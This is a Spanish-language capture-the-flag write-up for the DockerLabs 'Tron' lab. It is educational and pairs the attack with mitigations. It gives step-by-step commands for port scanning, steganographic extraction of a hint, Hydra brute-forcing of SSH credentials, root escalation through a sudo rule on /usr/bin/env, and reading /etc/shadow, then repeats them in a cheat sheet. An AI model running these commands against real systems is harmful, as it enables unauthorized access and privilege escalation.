# DockerLabs — Tron (Fácil) | Writeup paso a paso

> **Máquina:** Tron (inspirada en TRON: Legacy)
> **Plataforma:** DockerLabs (dockerlabs.es)
> **Dificultad:** Fácil
> **Sistema:** Linux (Ubuntu 26.04 dentro de contenedor)
> **IP del laboratorio:** `172.17.0.3` (la tuya puede ser `172.17.0.2`; ajústala)
> **Objetivo:** acceso inicial, escalada a root y captura de la flag
> **Flag:** `DL{disco}`

---

## 0. Antes de empezar

### 0.1. Desplegar la máquina
Descarga el `.tar` de la máquina desde DockerLabs y ejecuta el despliegue:

```bash
sudo ./auto_deploy.sh tron.tar
```

Al terminar, el script te indica la IP asignada (normalmente `172.17.0.2`). En este writeup la máquina quedó en `172.17.0.3`, así que **sustituye la IP por la tuya** en todos los comandos.

### 0.2. Herramientas que vamos a usar
| Herramienta | Para qué |
|---|---|
| `ping` | Comprobar conectividad y TTL |
| `nmap` | Descubrir puertos y versiones |
| `curl` / navegador | Ver la web y sus cabeceras |
| `whatweb` | Fingerprinting web |
| `feroxbuster` / `gobuster` | Buscar directorios/archivos ocultos |
| `steghide` | Extraer datos ocultos en imágenes |
| `exiftool` / `binwalk` | Analizar la imagen |
| `hydra` | Fuerza bruta de credenciales SSH |
| `sshpass` | Automatizar el login SSH con contraseña |

> ⚠️ **Ético:** hazlo solo contra las máquinas de tu propio laboratorio DockerLabs. No lo uses contra sistemas sin autorización.

---

## 1. Reconocimiento: ¿está viva la máquina?

```bash
ping -c 1 172.17.0.3
```

Salida relevante:

```text
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.050 ms
```

**¿Qué nos dice esto?**
- La máquina responde.
- `ttl=64` es típico de **Linux** (Windows suele dar 128).
- La latencia tan baja indica que está en la misma red local (contenedor Docker).

---

## 2. Escaneo de puertos

### 2.1. Escaneo completo de puertos TCP

```bash
nmap -p- --min-rate 2000 -n -Pn 172.17.0.3 -oN ports.txt
```

**Flags explicadas:**
- `-p-`: escanea los 65535 puertos TCP (no solo los 1000 habituales).
- `--min-rate 2000`: envía al menos 2000 paquetes por segundo (más rápido).
- `-n`: no resuelve DNS (más rápido y evita ruido).
- `-Pn`: no hace ping previo; asume que el host está vivo.
- `-oN ports.txt`: guarda la salida en texto.

Resultado:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Solo dos puertos: **SSH** y **HTTP**.

### 2.2. Detección de versiones y scripts básicos

```bash
nmap -sCV -p22,80 -n -Pn 172.17.0.3 -oN services.txt
```

Resultado:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))
|_http-title: TRON
|_http-server-header: Apache/2.4.66 (Ubuntu)
Service Info: OS: Linux
```

**Datos clave:**
- **OpenSSH 10.2p1** en Ubuntu.
- **Apache 2.4.66** en Ubuntu.
- La web se titula **TRON** → primera pista temática.

---

## 3. Enumeración web

### 3.1. Ver la página

```bash
curl -i http://172.17.0.3/
```

Salida (resumida):

```html
HTTP/1.1 200 OK
Server: Apache/2.4.66 (Ubuntu)
...
<title>TRON</title>
...
<h1>LEGACY</h1>
<img src="tron.jpg" alt="DOCKERLABS">
```

La web es muy simple: un título **TRON**, un encabezado **LEGACY** y una imagen **`tron.jpg`**.

### 3.2. Fingerprinting

```bash
whatweb -a 3 http://172.17.0.3/
```

Confirma Apache 2.4.66 / Ubuntu / título TRON. Nada más relevante.

### 3.3. Buscar directorios y archivos ocultos

```bash
feroxbuster -u http://172.17.0.3/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 50 --no-recursion -q \
  -s 200,204,301,302,307,401,403 \
  -x php,html,txt,bak,zip
```

Alternativa con gobuster:

```bash
gobuster dir -u http://172.17.0.3/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,bak,zip -t 50
```

Resultado:

```text
200  http://172.17.0.3/
200  http://172.17.0.3/index.html
200  http://172.17.0.3/tron.jpg
```

**Conclusión:** no hay paneles, backups ni archivos de configuración. El único recurso “extra” es **`tron.jpg`**. Eso nos lleva directos a la esteganografía.

### 3.4. Nikto (opcional, para completar)

```bash
nikto -h http://172.17.0.3/ -maxtime 60s
```

Reporta:
- Falta de cabeceras de seguridad (CSP, HSTS, X-Content-Type-Options, etc.).
- Apache 2.4.66 desactualizado.
- Métodos permitidos: `GET, POST, OPTIONS, HEAD`.

Son hallazgos menores; el vector real es la imagen.

---

## 4. Esteganografía: el secreto está en `tron.jpg`

### 4.1. Descargar y analizar la imagen

```bash
wget http://172.17.0.3/tron.jpg
file tron.jpg
ls -l tron.jpg
```

Resultado:

```text
tron.jpg: JPEG image data, JFIF standard 1.01, 518x415
-rw-r--r-- 1 root root 29698 ... tron.jpg
```

Comprobamos metadatos y posibles datos embebidos:

```bash
exiftool tron.jpg
binwalk tron.jpg
```

- `exiftool` no muestra comentarios sospechosos.
- `binwalk` solo detecta la cabecera JPEG, no hay archivos concatenados.

### 4.2. Extraer con steghide

`steghide` es una herramienta clásica para ocultar/extraer datos dentro de JPEG/BMP/WAV. Probamos con **passphrase vacía** (muy común en laboratorios):

```bash
steghide extract -sf tron.jpg -p "" -f
```

Salida:

```text
wrote extracted data to "disco.txt".
```

> Si no usas `-p ""`, `steghide` te pedirá una passphrase: pulsa **Enter** para dejarla vacía.

### 4.3. Leer el secreto

```bash
cat disco.txt
```

Contenido:

```text
quorra
"Lo que pasa con la perfección es que es incognoscible. Es imposible, pero también está justo frente a nosotros todo el tiempo."
```

**Interpretación:**
- **`quorra`** es un nombre del universo TRON (Quorra, la ISO). Nos servirá más adelante.
- La cita es temática y no aporta credenciales directamente.

> Guarda `quorra` en un bloc de notas: lo reutilizaremos al final con el binario `login_flynn`.

---

## 5. Acceso inicial: fuerza bruta SSH

Tenemos SSH abierto. La web se llama **TRON**, así que un nombre de usuario muy probable es **`tron`**. También probamos `quorra`, pero **no existe como usuario del sistema** (lo comprobaremos luego en `/etc/passwd`), así que la pista `quorra` es para el final.

### 5.1. Preparar una lista de contraseñas corta

Para no lanzar `rockyou.txt` entero (14 millones de claves) y esperar horas, creamos una lista dirigida con contraseñas débiles y temáticas:

```bash
cat > pws.txt <<'EOF'
tron
TRON
tron123
tron2024
legacy
quorra
flynn
clu
encom
admin
password
123456
EOF
```

### 5.2. Lanzar Hydra

```bash
hydra -l tron -P pws.txt -t 4 -f ssh://172.17.0.3
```

**Flags explicadas:**
- `-l tron`: usuario fijo `tron`.
- `-P pws.txt`: lista de contraseñas.
- `-t 4`: 4 hilos en paralelo (SSH suele limitar conexiones; no abuses).
- `-f`: detente al encontrar la primera credencial válida.
- `ssh://IP`: protocolo y objetivo.

Resultado:

```text
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: tron   password: tron
1 of 1 target successfully completed, 1 valid password found
```

**Credenciales encontradas: `tron:tron`.** Contraseña idéntica al usuario, un fallo crítico.

> **Nota real de laboratorio:** OpenSSH 10.2 incluye `PerSourcePenalties`. Si haces muchas pruebas fallidas seguidas, el servidor puede responder `Not allowed at this time` o cerrar la conexión. No es que la credencial sea mala: es una penalización temporal por IP. Espera **1–2 minutos** y reintenta. Verás este mensaje si abusas de Hydra.

### 5.3. Entrar por SSH

```bash
ssh tron@172.17.0.3
# contraseña: tron
```

O de forma automatizada:

```bash
sshpass -p 'tron' ssh -o StrictHostKeyChecking=no tron@172.17.0.3
```

Comprobación:

```bash
id
hostname
uname -a
```

Salida:

```text
uid=1001(tron) gid=1001(tron) groups=1001(tron)
b8dd55c1f2b3
Linux b8dd55c1f2b3 ... x86_64 GNU/Linux
```

✅ **Acceso inicial conseguido como usuario `tron`.**

---

## 6. Enumeración local y búsqueda de escalada

Ya dentro, lo primero es ver qué privilegios tenemos:

```bash
id
sudo -l
```

Salida clave:

```text
User tron may run the following commands on b8dd55c1f2b3:
    (ALL) NOPASSWD: /usr/bin/env
```

**Esto es la joya.** El usuario `tron` puede ejecutar `/usr/bin/env` como **root** y **sin contraseña**.

Otras comprobaciones útiles (para que veas la metodología):

```bash
cat /etc/passwd | grep -E "bash|sh$"
find / -perm -4000 -type f 2>/dev/null      # SUID
getcap -r / 2>/dev/null                     # capabilities
ls -la /opt /tmp /var/tmp
crontab -l; cat /etc/crontab
```

En `/etc/passwd` solo aparecen `root`, `ubuntu` y `tron` (por eso `quorra` no sirve para SSH). No hay SUID raros ni capabilities explotables; el vector claro es el `sudo`.

---

## 7. Escalada de privilegios: `sudo env` (GTFOBins)

`/usr/bin/env` sirve para ejecutar un programa con un entorno modificado. Si `sudo` te deja ejecutarlo como root, puedes pedirle que ejecute **cualquier binario** como root, por ejemplo una shell.

### 7.1. Comprobar que funciona

```bash
sudo -n /usr/bin/env id
```

Salida:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 7.2. Obtener shell de root

```bash
sudo /usr/bin/env /bin/bash
```

Dentro de la nueva shell:

```bash
id
whoami
```

Salida:

```text
uid=0(root) gid=0(root) groups=0(root)
root
```

También se puede hacer en un solo comando:

```bash
sudo /usr/bin/env /bin/bash -c 'id; whoami; hostname'
```

✅ **Somos root.**

> **Referencia:** GTFOBins (`https://gtfobins.github.io/`) documenta `env` como binario para escapar de sudo cuando se permite `NOPASSWD`.

---

## 8. Como root: archivos, binario y flag

### 8.1. Explorar `/root`

```bash
cd /root
ls -la
```

Contenido:

```text
-rwxr-xr-x 1 root root 17528 ... login_flynn
-rw-r--r-- 1 root root    87 ... sistema.txt
```

### 8.2. Leer `sistema.txt`

```bash
cat sistema.txt
```

Contenido:

```text
te hacke no eres root «La única forma de ganar el juego es no jugar»
¿esta seguro?
```

Es un mensaje/ broma temática; no es la flag.

### 8.3. Analizar `login_flynn`

```bash
file login_flynn
strings -n 5 login_flynn | grep -iE "red|user|pass|flag|quorra|denegado|felicidades"
```

Datos interesantes:

```text
RED JOHN
Username:
Password:
quorra
Felicidades! Has ganado.
Flag: DL{disco}
[-] ACCESO DENEGADO.
```

Es un binario **COBOL** (GnuCOBOL) que pide usuario y contraseña. La pista `quorra` que sacamos de la imagen es justamente la credencial del binario.

### 8.4. Ejecutarlo y capturar la flag

```bash
printf 'quorra\nquorra\n' | ./login_flynn
```

Salida:

```text
=========================================
                 RED JOHN
=========================================
Username: Password:
[+] ¡Felicidades! Has ganado.
Flag: DL{disco}
```

### 🚩 Flag

```text
DL{disco}
```

### 8.5. Prueba adicional de root (opcional)

```bash
sudo /usr/bin/env /bin/bash -c 'head -2 /etc/shadow'
```

```text
root:*:20658:0:99999:7:::
daemon:*:20658:0:99999:7:::
```

Solo root puede leer `/etc/shadow`; es una prueba irrefutable de la escalada.

---

## 9. Resumen de la cadena de ataque

```text
Reconocimiento (ping/nmap)
        │
        ▼
22/SSH + 80/HTTP (Apache 2.4.66, título "TRON")
        │
        ▼
Enumeración web → solo index.html + tron.jpg
        │
        ▼
Esteganografía (steghide, passphrase vacía)
        │
        ▼
disco.txt → pista "quorra"
        │
        ▼
Fuerza bruta SSH (usuario "tron", lista dirigida) → tron:tron
        │
        ▼
Acceso inicial como tron (uid 1001)
        │
        ▼
sudo -l → (ALL) NOPASSWD: /usr/bin/env
        │
        ▼
sudo /usr/bin/env /bin/bash → ROOT
        │
        ▼
/root → sistema.txt + login_flynn
        │
        ▼
login_flynn con quorra:quorra → Flag DL{disco}
```

---

## 10. Vulnerabilidades encontradas y mitigaciones

| # | Vulnerabilidad | Severidad | Impacto | Mitigación |
|---|---|---|---|---|
| 1 | Contraseña SSH débil (`tron:tron`) | **Crítica** | Acceso inicial no autorizado | Política de contraseñas robusta, MFA, deshabilitar `PasswordAuthentication` y usar claves SSH |
| 2 | `sudo NOPASSWD` sobre `/usr/bin/env` | **Crítica** | Escalada directa a root | Eliminar la regla; usar allowlist de comandos concretos y exigir contraseña |
| 3 | Secretos ocultos en recurso público (`tron.jpg` → `disco.txt`) | **Alta** | Descubrimiento de credenciales/pistas | No ocultar secretos en imágenes; tratar los recursos web como públicos |
| 4 | SSH expuesto a toda la red | **Alta** | Superficie de fuerza bruta | Restringir por firewall/VPN, `fail2ban`, límite de intentos |
| 5 | Apache 2.4.66 desactualizado | **Media** | Posibles CVEs conocidas | Mantener Apache actualizado |
| 6 | Cabeceras de seguridad HTTP ausentes | **Baja** | Mayor superficie XSS/clickjacking | Añadir CSP, HSTS, `X-Content-Type-Options`, `Referrer-Policy` |

### Buenas prácticas extra
- Auditar `sudo -l` de todos los usuarios y revisar GTFOBins.
- Monitorizar intentos fallidos de SSH (auth.log) y alertar.
- No usar el mismo nombre de usuario y contraseña.
- Revisar imágenes/documentos públicos en busca de metadatos o esteganografía antes de publicarlos.

---

## 11. Cómo publicar este writeup en DockerLabs

DockerLabs tiene una sección de gestión de writeups dentro de la cuenta:

1. Entra en **https://dockerlabs.es/** e inicia sesión.
2. Abre el menú y ve a **Gestión writeups**.
3. Usa **“Mis writeups pendientes”** para registrar/enviar tu writeup y **“Writeups publicados”** para ver los aprobados.
4. Si el formulario pide un enlace, publica primero el writeup en Medium, GitHub Pages, Notion o tu blog y pega la URL.

### Plantilla de título recomendada
```text
DockerLabs — Tron (Fácil) | Writeup paso a paso
```

### Estructura recomendada del envío
1. **Ficha:** máquina, dificultad, sistema, IP, autor, fecha.
2. **Reconocimiento:** `ping`, `nmap`.
3. **Enumeración web:** `curl`, `whatweb`, `feroxbuster`.
4. **Esteganografía:** `steghide` → `disco.txt`.
5. **Acceso inicial:** `hydra` → `tron:tron`.
6. **Escalada:** `sudo -l` → `env` → root.
7. **Flag:** `DL{disco}`.
8. **Mitigaciones.**
9. **Conclusión / aprendizaje.**

### Consejos para que te lo acepten
- Usa **capturas de pantalla** de los comandos clave (nmap, hydra, `sudo -l`, `id`, flag).
- No publiques datos personales ni credenciales reales de otros sistemas.
- Explica **el porqué** de cada comando, no solo lo pegues.
- Sé original: no copies otro writeup; describe tu propio proceso.
- Revisa ortografía y formato Markdown.

---

## 12. Cheat sheet (todos los comandos en orden)

```bash
# 1. Reconocimiento
ping -c 1 172.17.0.3
nmap -p- --min-rate 2000 -n -Pn 172.17.0.3 -oN ports.txt
nmap -sCV -p22,80 -n -Pn 172.17.0.3 -oN services.txt

# 2. Web
curl -i http://172.17.0.3/
whatweb -a 3 http://172.17.0.3/
feroxbuster -u http://172.17.0.3/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 --no-recursion -q -s 200,204,301,302,307,401,403 -x php,html,txt,bak,zip

# 3. Esteganografía
wget http://172.17.0.3/tron.jpg
exiftool tron.jpg
binwalk tron.jpg
steghide extract -sf tron.jpg -p "" -f
cat disco.txt

# 4. Fuerza bruta SSH
cat > pws.txt <<'EOF'
tron
TRON
tron123
tron2024
legacy
quorra
flynn
clu
encom
admin
password
123456
EOF
hydra -l tron -P pws.txt -t 4 -f ssh://172.17.0.3

# 5. Acceso inicial
ssh tron@172.17.0.3        # password: tron
id
hostname
uname -a

# 6. Enumeración local
sudo -l
cat /etc/passwd | grep -E "bash|sh$"
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null

# 7. Escalada
sudo -n /usr/bin/env id
sudo /usr/bin/env /bin/bash
id
whoami

# 8. Root y flag
cd /root
ls -la
cat sistema.txt
strings -n 5 login_flynn | grep -iE "user|pass|flag|quorra"
printf 'quorra\nquorra\n' | ./login_flynn
head -2 /etc/shadow
```

---

## 13. Conclusión

La máquina **Tron** es un laboratorio ideal para principiantes porque encadena técnicas muy distintas y muy reales:

1. **Enumeración** con nmap y herramientas web.
2. **Esteganografía** con steghide (la pista estaba escondida en una imagen pública).
3. **Fuerza bruta** de credenciales SSH débiles.
4. **Mala configuración de sudo** (`NOPASSWD` sobre `env`), un clásico de GTFOBins.
5. **Post-explotación** y captura de la flag.

La lección principal: **una imagen pública, una contraseña débil y una regla de sudo mal puesta pueden llevar de cero a root en minutos.** Defiende en profundidad: contraseñas fuertes, MFA, sudo mínimo y nada de secretos “escondidos” en recursos públicos.

---

**Flag final:** `DL{disco}`
